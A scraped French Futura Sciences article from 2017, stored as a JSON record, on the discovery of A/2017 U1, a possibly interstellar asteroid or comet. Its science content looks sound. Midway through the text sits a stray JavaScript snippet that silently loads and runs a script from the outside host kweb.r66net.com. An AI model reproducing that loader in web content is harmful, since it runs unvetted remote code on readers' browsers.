{"title": "Decouverte d'un etrange asteroide qui pourrait venir d'une autre etoile", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-10-27", "content": "Les premieres observations d'un petit corps celeste qui vient d'etre decouvert suggerent qu'il vient de l'espace interstellaire. Si cela se confirme, ce serait le premier cas connu d'une comete ou d'un asteroide venu d'ailleurs. Mais d'ou ? Ce qu'il faut retenir C/2017 U1, d'abord consideree comme une comete, a ete decouverte le 18 octobre par les telescopes du sondage PanSTARRS 1, a Hawai. Sa plus petite distance avec la Terre etait le 14 octobre. Sa trajectoire hyperbolique suggere qu'elle ne viendrait pas de notre Systeme solaire mais de l'espace interstellaire. Si les observations le confirment, A/2017 U1 ou C/2017 U1, asteroide ou comete, serait le premier corps identifie comme venu d'ailleurs. Chaque semaine, de  nouvelles cometes  sont decouvertes alors qu'elles s'approchent ou entrent dans le  Systeme solaire  interne. Petits corps celestes glaces plus ou moins lumineux, selon l'activite de leur noyau rechauffe par le  Soleil , elles ont beaucoup a nous dire sur les  origines de notre Systeme solaire . La plupart viennent des regions les plus eloignees de notre  etoile , au-dela de  Neptune , a des dizaines ou des centaines de milliards de kilometres. Certaines deboulent pour la premiere fois dans la region ou gravitent les planetes les plus proches du Soleil (les quatre  planetes telluriques ). Tandis que d'autres, a courte periode, par exemple Halley ou  Tchouri , sont des habituees. Mais le 18 octobre, des astronomes ont repere dans les sondages realises par les  telescopes PanSTARRS 1  installes sur l'Haleakala, a Hawai, un etrange visiteur a quelque 37 millions de kilometres du Soleil. D'abord baptise  C/2017 U1 , l'objet vient d'etre requalifie en  A/2017 U1 , suggerant une nature d' asteroide  plutot que de  comete . En tout cas, l' astre  parait tres presse et surtout, et c'est plutot inhabituel, sa trajectoire montre une extreme  excentricite  hyperbolique (1,19). Aussi, et si d'autres observations ulterieures le confirment,  << cet objet pourrait etre le premier cas evident d'une comete interstellaire >> , a declare a Sky&Telescope Gareth Williams, qui codirige le MPC ( International Astronomical Union's Minor Planet Center ), centre qui engrange les donnees des petits corps celestes. En jaune, la trajectoire de l'objet C/2017 U1 renomme A/2017 U1. Son orbite est inclinee a 122deg par rapport au plan de l'ecliptique. Son excentricite hyperbolique est de 1,19. (c) Nasa, JPL, Horizons                               D'ou vient cette comete ou cet asteroide apparemment interstellaire ? L'astre est tres pale ( magnitude  20). De premiers calculs bases sur sa  luminosite  estiment pour l'instant sa taille a 160 m. Assez petit, il a malgre tout survecu a la  chaleur  du Soleil lorsqu'il etait au plus pres de lui, en septembre. C'est une des raisons pour lesquelles les chercheurs s'orientent sur la piste d'un asteroide plutot qu'une comete. Le suppose visiteur  interstellaire  file assez vite, a quelque 26 km/s. Si c'est une comete,  << elle n'a peut-etre pas eu le temps de se rechauffer suffisamment pour se briser >> , suggere Bill  Gray , un dynamicien qui s'interesse a elle.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  A/2017 U1 est passe dans le voisinage de la  Terre , le 14 octobre dernier, a environ 24 millions de kilometres. Et nous ne sommes pas prets de le revoir, car il se dirige vers l'espace interstellaire... Ou sera-t-il dans un million d'annees ? A une quinzaine d' annees-lumiere ..., et peut-etre rendra-t-il visite a d'autres etoiles. Voir aussi : Comete, meteorite, asteroide, etoile filante : quelle est la difference ? Evidemment, cet asteroide (ou comete) venu d'ailleurs aurait beaucoup de choses a nous raconter. Cela suscite beaucoup de questions : quelle est sa composition ?, est-il similaire a nos asteroides ?, a-t-il visite d'autres etoiles ?, quelle est son etoile d'origine ?, etc. Pour l'instant, tout ce que peuvent dire les astronomes qui l'etudient est qu'il vient de la direction de  Vega  (mais pas exactement), l'etoile la plus brillante de la  constellation  de la Lyre.  << C'est exactement ce qu'on peut attendre [notre Systeme solaire se deplace dans la  Voie lactee , en direction des etoiles de la Lyre,  NDLR ]. Il devrait y avoir davantage de cometes interstellaires venant de la direction vers laquelle le Soleil se dirige >> , explique Luke Dones, du  Southwest Research Institute  (SwRI) a Boulder, dans le Colorado. Dans le passe, la seule autre comete soupconnee de venir d'ailleurs etait C/1980 E1 Bowell. Mais son excentricite (1,05) a pu etre provoquee en cours de route par son passage a 35 millions de kilometres de  Jupiter . Peut-etre en a-t-il ete de meme pour C/2017 U1 ? Les chercheurs ne l'excluent pas. L'enquete est en cours et nous devrions en savoir plus sur son histoire dans les semaines a venir. La comete Tchouri en images                       L'epopee de Rosetta autour de la comete Tchouri en 210 images. Revivez les grands moments de cette mission historique de l'ESA qui a vu une sonde espionner une comete durant plus de deux ans et le robot Philae se poser a sa surface.                                       Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  decouverte etrange  |  pourrait prevoir reveille reveil des volcan  |  500 ne pouvez pas venir ici  |  televisions venir  |  cometes venir  |  truc etrange  |  oiseau etrange  |  phenomene etrange  |  etrange disparition", "theme": "sciences"}